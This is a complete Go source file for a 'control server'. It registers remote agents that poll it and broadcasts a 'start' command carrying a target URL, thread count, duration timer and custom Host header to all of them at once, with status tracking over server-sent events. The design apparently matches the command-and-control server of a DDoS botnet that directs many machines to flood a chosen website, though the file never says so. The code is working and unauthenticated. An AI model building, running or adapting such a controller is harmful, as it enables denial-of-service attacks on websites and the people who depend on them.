// control_server.go
package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ─── Models & Store ───────────────────────────────────────────────────────────

type Command struct {
	Action     string `json:"action"`
	URL        string `json:"url"`
	Threads    int    `json:"threads"`
	Timer      int    `json:"timer"`
	CustomHost string `json:"custom_host"`
}

type AgentStatus struct {
	Online   bool   `json:"Online"`
	Status   string `json:"Status"`
	LastPing string `json:"LastPing"`
}

type eventPayload struct {
	AgentID string
	Name    string
	Data    interface{}
}

type Store struct {
	agents     map[string]bool
	agentsMu   sync.Mutex
	pending    map[string][]Command
	cmdsMu     sync.Mutex
	statuses   map[string]*AgentStatus
	statusMu   sync.RWMutex
	sseClients map[string]*sseClient
	sseMu      sync.Mutex
}

func NewStore() *Store {
	return &Store{
		agents:     make(map[string]bool),
		pending:    make(map[string][]Command),
		statuses:   make(map[string]*AgentStatus),
		sseClients: make(map[string]*sseClient),
	}
}

type sseClient struct {
	id      string
	agentID string
	writer  http.ResponseWriter
	flusher http.Flusher
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(v); err != nil {
		log.Printf("[CONTROL] writeJSON error: %v", err)
	}
}

func methodNotAllowed(w http.ResponseWriter) {
	http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
}

// ─── SSE Management ──────────────────────────────────────────────────────────

func (s *Store) addClient(c *sseClient) {
	s.sseMu.Lock()
	s.sseClients[c.id] = c
	s.sseMu.Unlock()
}

func (s *Store) removeClient(id string) {
	s.sseMu.Lock()
	delete(s.sseClients, id)
	s.sseMu.Unlock()
}

func (s *Store) sseHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		methodNotAllowed(w)
		return
	}

	agentID := r.URL.Query().Get("agentID")
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	fl, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
		return
	}

	clientID := agentID + "_" + strconv.FormatInt(time.Now().UnixNano(), 10)
	client := &sseClient{id: clientID, agentID: agentID, writer: w, flusher: fl}
	s.addClient(client)

	// initial handshake
	fmt.Fprintf(w, ": connected\n\nretry: 2000\n\n")
	fl.Flush()

	pingTicker := time.NewTicker(5 * time.Second)
	defer func() {
		pingTicker.Stop()
		s.removeClient(clientID)
	}()

	for {
		select {
		case <-r.Context().Done():
			return
		case <-pingTicker.C:
			if _, err := fmt.Fprintf(w, ": ping\n\n"); err != nil {
				return
			}
			fl.Flush()
		}
	}
}

func (s *Store) runSSEBroker(events <-chan eventPayload) {
	for ev := range events {
		var targets []*sseClient

		// snapshot under lock
		s.sseMu.Lock()
		for _, c := range s.sseClients {
			switch ev.Name {
			case "command-enqueued":
				if c.agentID == ev.AgentID {
					targets = append(targets, c)
				}
			case "agent-status-changed":
				if c.agentID == "" || c.agentID == ev.AgentID {
					targets = append(targets, c)
				}
			}
		}
		s.sseMu.Unlock()

		// send outside lock
		switch ev.Name {
		case "command-enqueued":
			raw, _ := json.Marshal(ev.Data)
			for _, c := range targets {
				fmt.Fprintf(c.writer, "event: %s\n", ev.Name)
				fmt.Fprintf(c.writer, "data: %s\n\n", raw)
				c.flusher.Flush()
			}

		case "agent-status-changed":
			payload := map[string]interface{}{
				"agentID": ev.AgentID,
				"status":  ev.Data,
			}
			raw, _ := json.Marshal(payload)
			for _, c := range targets {
				fmt.Fprintf(c.writer, "event: %s\n", ev.Name)
				fmt.Fprintf(c.writer, "data: %s\n\n", raw)
				c.flusher.Flush()
			}
		}
	}
}

// ─── Offline Watcher ─────────────────────────────────────────────────────────

func (s *Store) runOfflineWatcher(timeout time.Duration, events chan<- eventPayload) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for now := range ticker.C {
		cutoff := now.UTC().Add(-timeout)
		var toOffline []string

		s.statusMu.RLock()
		for id, st := range s.statuses {
			last, err := time.Parse(time.RFC3339, st.LastPing)
			if err == nil && st.Online && last.Before(cutoff) {
				toOffline = append(toOffline, id)
			}
		}
		s.statusMu.RUnlock()

		for _, id := range toOffline {
			s.statusMu.Lock()
			st := s.statuses[id]
			st.Online = false
			st.Status = ""
			s.statusMu.Unlock()

			events <- eventPayload{AgentID: id, Name: "agent-status-changed", Data: *st}
			log.Printf("[CONTROL] Marked %s OFFLINE", id)
		}
	}
}

// ─── HTTP Handlers ───────────────────────────────────────────────────────────

// enqueue start commands to all agents
func (s *Store) handleCommand(events chan<- eventPayload) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			methodNotAllowed(w)
			return
		}
		if err := r.ParseForm(); err != nil {
			http.Error(w, "invalid form data", http.StatusBadRequest)
			return
		}

		threads, err1 := strconv.Atoi(r.FormValue("threads"))
		timer, err2 := strconv.Atoi(r.FormValue("timer"))
		if err1 != nil || err2 != nil {
			http.Error(w, "invalid numeric parameter", http.StatusBadRequest)
			return
		}

		cmd := Command{
			Action:     "start",
			URL:        strings.TrimSpace(r.FormValue("url")),
			Threads:    threads,
			Timer:      timer,
			CustomHost: r.FormValue("custom_host"),
		}

		var evs []eventPayload
		s.agentsMu.Lock()
		for id := range s.agents {
			s.cmdsMu.Lock()
			s.pending[id] = append(s.pending[id], cmd)
			s.cmdsMu.Unlock()
			evs = append(evs, eventPayload{AgentID: id, Name: "command-enqueued", Data: cmd})
		}
		s.agentsMu.Unlock()

		go func() {
			for _, ev := range evs {
				events <- ev
				log.Printf("[CONTROL] Enqueued %+v to %s", cmd, ev.AgentID)
			}
		}()

		http.Redirect(w, r, "/", http.StatusSeeOther)
	}
}

func (s *Store) agentPollHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agentID")
	if agentID == "" {
		http.Error(w, "agentID required", http.StatusBadRequest)
		return
	}

	now := time.Now().UTC().Format(time.RFC3339)
	s.agentsMu.Lock()
	s.agents[agentID] = true
	s.agentsMu.Unlock()

	s.statusMu.Lock()
	if st, ok := s.statuses[agentID]; ok {
		st.Online = true
		st.LastPing = now
	} else {
		s.statuses[agentID] = &AgentStatus{Online: true, Status: "Ready", LastPing: now}
	}
	s.statusMu.Unlock()

	s.cmdsMu.Lock()
	queue := s.pending[agentID]
	if len(queue) > 0 {
		cmd := queue[0]
		s.pending[agentID] = queue[1:]
		s.cmdsMu.Unlock()
		writeJSON(w, cmd)
		return
	}
	s.cmdsMu.Unlock()

	writeJSON(w, Command{Action: "none"})
}

func (s *Store) agentStatusHandler(events chan<- eventPayload) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			methodNotAllowed(w)
			return
		}

		var p struct {
			AgentID string `json:"agentID"`
			Status  string `json:"status"`
		}
		if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
			http.Error(w, "invalid JSON", http.StatusBadRequest)
			return
		}

		now := time.Now().UTC().Format(time.RFC3339)
		s.statusMu.Lock()
		st, ok := s.statuses[p.AgentID]
		if !ok {
			s.agentsMu.Lock()
			s.agents[p.AgentID] = true
			s.agentsMu.Unlock()
			st = &AgentStatus{}
			s.statuses[p.AgentID] = st
		}
		st.Online = true
		st.Status = p.Status
		st.LastPing = now
		s.statusMu.Unlock()

		events <- eventPayload{AgentID: p.AgentID, Name: "agent-status-changed", Data: *st}
		w.WriteHeader(http.StatusOK)
	}
}

func (s *Store) listAgentStatuses(w http.ResponseWriter, r *http.Request) {
	s.statusMu.RLock()
	defer s.statusMu.RUnlock()

	out := make(map[string]AgentStatus, len(s.statuses))
	for id, st := range s.statuses {
		if !st.Online {
			out[id] = AgentStatus{Online: false, Status: "", LastPing: st.LastPing}
		} else {
			out[id] = *st
		}
	}
	writeJSON(w, out)
}

func renderInterface(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "Interface/index.html")
}

// ─── Main ────────────────────────────────────────────────────────────────────

func main() {
	addr := flag.String("addr", ":8080", "listen address")
	offlineTO := flag.Duration("offline-timeout", 3*time.Second, "offline timeout")
	flag.Parse()

	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	log.Println("[CONTROL] Starting")

	store := NewStore()
	events := make(chan eventPayload, 1000)
	defer close(events)

	go store.runSSEBroker(events)
	go store.runOfflineWatcher(*offlineTO, events)

	mux := http.NewServeMux()
	mux.Handle("/Interface/", http.StripPrefix("/Interface/", http.FileServer(http.Dir("Interface"))))
	mux.HandleFunc("/events", store.sseHandler)
	mux.HandleFunc("/command", store.handleCommand(events))
	mux.HandleFunc("/poll-agent", store.agentPollHandler)
	mux.HandleFunc("/agent-status", store.agentStatusHandler(events))
	mux.HandleFunc("/agent-statuses", store.listAgentStatuses)
	mux.HandleFunc("/", renderInterface)

	srv := &http.Server{
		Addr:         *addr,
		Handler:      mux,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 0,
		IdleTimeout:  60 * time.Second,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)),
	}

	// graceful shutdown
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	go func() {
		<-ctx.Done()
		log.Println("[CONTROL] Shutting down")
		shCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		srv.Shutdown(shCtx)
	}()

	log.Printf("[CONTROL] Listening on %s\n", *addr)
	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("[CONTROL] ListenAndServe: %v", err)
	}

	log.Println("[CONTROL] Stopped")
}
